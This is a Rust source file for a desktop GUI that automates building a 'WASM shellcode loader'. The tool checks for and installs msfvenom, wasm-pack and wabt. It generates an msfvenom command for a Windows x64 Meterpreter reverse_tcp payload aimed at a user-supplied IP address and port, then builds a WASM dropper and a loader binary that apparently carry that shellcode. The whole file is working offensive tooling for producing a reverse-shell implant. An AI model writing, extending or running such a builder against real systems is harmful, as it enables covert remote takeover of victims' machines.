use eframe::egui;
use std::process::Command;
use std::path::Path;

fn main() -> Result<(), eframe::Error> {
    env_logger::init(); // Log to stderr (if you run with `RUST_LOG=debug`).

    let options = eframe::NativeOptions {
        viewport: egui::ViewportBuilder::default().with_inner_size([640.0, 480.0]),
        ..Default::default()
    };

    eframe::run_native(
        "WASM Shellcode Loader GUI",
        options,
        Box::new(|_cc| Ok(Box::new(WasmLoaderApp::default()))),
    )
}

#[derive(Default)]
struct WasmLoaderApp {
    ip_address: String,
    port: String,
    generated_command: String,
    status: String,
    tools_status: ToolsStatus,
}

#[derive(Default)]
struct ToolsStatus {
    wasm_pack_installed: Option<bool>,
    wabt_installed: Option<bool>,
    msfvenom_available: Option<bool>,
    cargo_available: Option<bool>,
}

impl eframe::App for WasmLoaderApp {
    fn update(&mut self, ctx: &egui::Context, _frame: &mut eframe::Frame) {
        egui::CentralPanel::default().show(ctx, |ui| {
            ui.heading("WASM Shellcode Loader Automation");
            ui.separator();

            // Tools Status Section
            ui.heading("Tools Status");
            if ui.button("Check Tools").clicked() {
                self.check_tools_status();
            }

            ui.horizontal(|ui| {
                ui.label("wasm-pack:");
                match self.tools_status.wasm_pack_installed {
                    Some(true) => ui.colored_label(egui::Color32::GREEN, "✓ Installed"),
                    Some(false) => ui.colored_label(egui::Color32::RED, "✗ Not installed"),
                    None => ui.label("Unknown"),
                };
            });

            ui.horizontal(|ui| {
                ui.label("wabt (wasm2wat):");
                match self.tools_status.wabt_installed {
                    Some(true) => ui.colored_label(egui::Color32::GREEN, "✓ Installed"),
                    Some(false) => ui.colored_label(egui::Color32::RED, "✗ Not installed"),
                    None => ui.label("Unknown"),
                };
            });

            ui.horizontal(|ui| {
                ui.label("msfvenom:");
                match self.tools_status.msfvenom_available {
                    Some(true) => ui.colored_label(egui::Color32::GREEN, "✓ Available"),
                    Some(false) => ui.colored_label(egui::Color32::RED, "✗ Not available"),
                    None => ui.label("Unknown"),
                };
            });

            ui.horizontal(|ui| {
                ui.label("cargo:");
                match self.tools_status.cargo_available {
                    Some(true) => ui.colored_label(egui::Color32::GREEN, "✓ Available"),
                    Some(false) => ui.colored_label(egui::Color32::RED, "✗ Not available"),
                    None => ui.label("Unknown"),
                };
            });

            ui.separator();

            // Installation Section
            ui.heading("Install Missing Tools");
            
            if !self.tools_status.wasm_pack_installed.unwrap_or(true) {
                if ui.button("Install wasm-pack").clicked() {
                    self.install_wasm_pack();
                }
            }

            if !self.tools_status.wabt_installed.unwrap_or(true) {
                if ui.button("Install wabt (wasm2wat)").clicked() {
                    self.install_wabt();
                }
            }

            ui.separator();

            // Configuration Section
            ui.heading("Payload Configuration");
            
            ui.horizontal(|ui| {
                ui.label("IP Address:");
                ui.text_edit_singleline(&mut self.ip_address);
            });

            ui.horizontal(|ui| {
                ui.label("Port:");
                ui.text_edit_singleline(&mut self.port);
            });

            ui.separator();

            // Command Generation Section
            ui.heading("Command Generation");
            
            if ui.button("Generate msfvenom Command").clicked() {
                self.generate_msfvenom_command();
            }

            if !self.generated_command.is_empty() {
                ui.label("Generated Command:");
                ui.text_edit_multiline(&mut self.generated_command);
                
                if ui.button("Copy to Clipboard").clicked() {
                    ui.output_mut(|o| o.copied_text = self.generated_command.clone());
                    self.status = "Command copied to clipboard!".to_string();
                }
            }

            ui.separator();

            // Build Section
            ui.heading("Build Pipeline");
            
            if ui.button("Run Full Build Pipeline").clicked() {
                self.run_full_pipeline();
            }

            if ui.button("Build WASM Dropper").clicked() {
                self.build_wasm_dropper();
            }

            if ui.button("Convert WASM to WAT").clicked() {
                self.convert_wasm_to_wat();
            }

            if ui.button("Build WASM Loader").clicked() {
                self.build_wasm_loader();
            }

            ui.separator();

            // Status Section
            if !self.status.is_empty() {
                ui.heading("Status");
                ui.label(&self.status);
            }
        });
    }
}

impl WasmLoaderApp {
    fn check_tools_status(&mut self) {
        self.tools_status.wasm_pack_installed = Some(self.check_command_exists("wasm-pack"));
        self.tools_status.cargo_available = Some(self.check_command_exists("cargo"));
        self.tools_status.msfvenom_available = Some(self.check_command_exists("msfvenom"));
        
        // Check if wabt is installed by looking for wasm2wat in the wabt directory or PATH
        let wabt_local = Path::new("./wabt/bin/wasm2wat").exists() || 
                        Path::new("./wabt/bin/wasm2wat.exe").exists();
        let wabt_system = self.check_command_exists("wasm2wat");
        self.tools_status.wabt_installed = Some(wabt_local || wabt_system);
        
        self.status = "Tools status checked".to_string();
    }

    fn check_command_exists(&self, command: &str) -> bool {
        Command::new("which")
            .arg(command)
            .output()
            .map(|output| output.status.success())
            .unwrap_or_else(|_| {
                // Fallback for Windows
                Command::new("where")
                    .arg(command)
                    .output()
                    .map(|output| output.status.success())
                    .unwrap_or(false)
            })
    }

    fn install_wasm_pack(&mut self) {
        self.status = "Installing wasm-pack...".to_string();
        
        match Command::new("cargo")
            .args(&["install", "wasm-pack"])
            .output()
        {
            Ok(output) => {
                if output.status.success() {
                    self.status = "wasm-pack installed successfully!".to_string();
                    self.tools_status.wasm_pack_installed = Some(true);
                } else {
                    self.status = format!("Failed to install wasm-pack: {}", 
                        String::from_utf8_lossy(&output.stderr));
                }
            }
            Err(e) => {
                self.status = format!("Error installing wasm-pack: {}", e);
            }
        }
    }

    fn install_wabt(&mut self) {
        self.status = "Installing wabt...".to_string();
        
        // Determine the appropriate download URL based on the platform
        let (url, filename) = if cfg!(target_os = "windows") {
            ("https://github.com/WebAssembly/wabt/releases/latest/download/wabt-1.0.37-windows.tar.gz", 
             "wabt.tar.gz")
        } else {
            ("https://github.com/WebAssembly/wabt/releases/latest/download/wabt-1.0.37-ubuntu-20.04.tar.gz", 
             "wabt.tar.gz")
        };

        // Download and extract wabt
        let download_result = Command::new("curl")
            .args(&["-L", "-o", filename, url])
            .output();

        match download_result {
            Ok(output) if output.status.success() => {
                // Extract the archive
                let _extract_result = Command::new("tar")
                    .args(&["-xzf", filename, "-C", ".", "--strip-components", "1"])
                    .current_dir("wabt")
                    .output();

                // Create wabt directory first if it doesn't exist
                let _ = std::fs::create_dir_all("wabt");
                
                let extract_result = Command::new("tar")
                    .args(&["-xzf", filename, "-C", "wabt", "--strip-components", "1"])
                    .output();

                match extract_result {
                    Ok(output) if output.status.success() => {
                        self.status = "wabt installed successfully!".to_string();
                        self.tools_status.wabt_installed = Some(true);
                        // Clean up downloaded file
                        let _ = std::fs::remove_file(filename);
                    }
                    Ok(output) => {
                        self.status = format!("Failed to extract wabt: {}", 
                            String::from_utf8_lossy(&output.stderr));
                    }
                    Err(e) => {
                        self.status = format!("Error extracting wabt: {}", e);
                    }
                }
            }
            Ok(output) => {
                self.status = format!("Failed to download wabt: {}", 
                    String::from_utf8_lossy(&output.stderr));
            }
            Err(e) => {
                self.status = format!("Error downloading wabt: {}", e);
            }
        }
    }

    fn generate_msfvenom_command(&mut self) {
        if self.ip_address.is_empty() || self.port.is_empty() {
            self.status = "Please enter both IP address and port".to_string();
            return;
        }

        self.generated_command = format!(
            "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={} LPORT={} -f rust",
            self.ip_address, self.port
        );
        
        self.status = "msfvenom command generated!".to_string();
    }

    fn run_full_pipeline(&mut self) {
        self.status = "Running full build pipeline...".to_string();
        
        // Check if we have the necessary tools
        if !self.tools_status.wasm_pack_installed.unwrap_or(false) {
            self.status = "Error: wasm-pack not installed. Please install it first.".to_string();
            return;
        }

        if !self.tools_status.wabt_installed.unwrap_or(false) {
            self.status = "Error: wabt not installed. Please install it first.".to_string();
            return;
        }

        // Step 1: Build wasm_dropper
        self.build_wasm_dropper();
        
        // Step 2: Convert to WAT
        self.convert_wasm_to_wat();
        
        // Step 3: Build wasm_loader
        self.build_wasm_loader();
    }

    fn build_wasm_dropper(&mut self) {
        self.status = "Building wasm_dropper...".to_string();
        
        match Command::new("wasm-pack")
            .args(&["build", "--release"])
            .current_dir("wasm_dropper")
            .output()
        {
            Ok(output) => {
                if output.status.success() {
                    self.status = "wasm_dropper built successfully!".to_string();
                } else {
                    self.status = format!("Failed to build wasm_dropper: {}", 
                        String::from_utf8_lossy(&output.stderr));
                }
            }
            Err(e) => {
                self.status = format!("Error building wasm_dropper: {}", e);
            }
        }
    }

    fn convert_wasm_to_wat(&mut self) {
        self.status = "Converting WASM to WAT...".to_string();
        
        // Determine the wasm2wat executable path
        let wasm2wat_exe = if Path::new("./wabt/bin/wasm2wat.exe").exists() {
            "./wabt/bin/wasm2wat.exe"
        } else if Path::new("./wabt/bin/wasm2wat").exists() {
            "./wabt/bin/wasm2wat"
        } else {
            "wasm2wat" // Assume it's in PATH
        };

        // Ensure the target directory exists
        let target_dir = Path::new("./target/wasm32-unknown-unknown/release");
        if !target_dir.exists() {
            self.status = "Error: WASM binary not found. Please build wasm_dropper first.".to_string();
            return;
        }

        let wasm_file = "./target/wasm32-unknown-unknown/release/wasm_dropper.wasm";
        let wat_file = "./wasm_loader/src/wasm_dropper.wat";

        match Command::new(wasm2wat_exe)
            .args(&[wasm_file, "-o", wat_file])
            .output()
        {
            Ok(output) => {
                if output.status.success() {
                    self.status = "WASM converted to WAT successfully!".to_string();
                } else {
                    self.status = format!("Failed to convert WASM to WAT: {}", 
                        String::from_utf8_lossy(&output.stderr));
                }
            }
            Err(e) => {
                self.status = format!("Error converting WASM to WAT: {}", e);
            }
        }
    }

    fn build_wasm_loader(&mut self) {
        self.status = "Building wasm_loader...".to_string();
        
        match Command::new("cargo")
            .args(&["build", "--release"])
            .current_dir("wasm_loader")
            .output()
        {
            Ok(output) => {
                if output.status.success() {
                    self.status = "wasm_loader built successfully! Binary is at ./target/release/wasm_loader".to_string();
                } else {
                    self.status = format!("Failed to build wasm_loader: {}", 
                        String::from_utf8_lossy(&output.stderr));
                }
            }
            Err(e) => {
                self.status = format!("Error building wasm_loader: {}", e);
            }
        }
    }
}